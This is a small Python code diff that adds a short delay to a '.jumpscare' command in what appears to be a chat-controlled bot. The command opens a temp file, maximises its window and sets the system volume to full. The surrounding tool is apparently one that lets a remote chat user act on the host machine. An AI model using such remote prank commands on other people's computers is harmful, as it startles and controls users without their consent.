@@ -25,6 +25,7 @@ elif message.content == '.jumpscare':
 
     time.sleep(1)
     os.startfile(temp_file)
+    time.sleep(0.6)
     get_video_window = win32gui.GetForegroundWindow()
     win32gui.ShowWindow(get_video_window, win32con.SW_MAXIMIZE)
     volume.SetMasterVolumeLevelScalar(1.0, None)
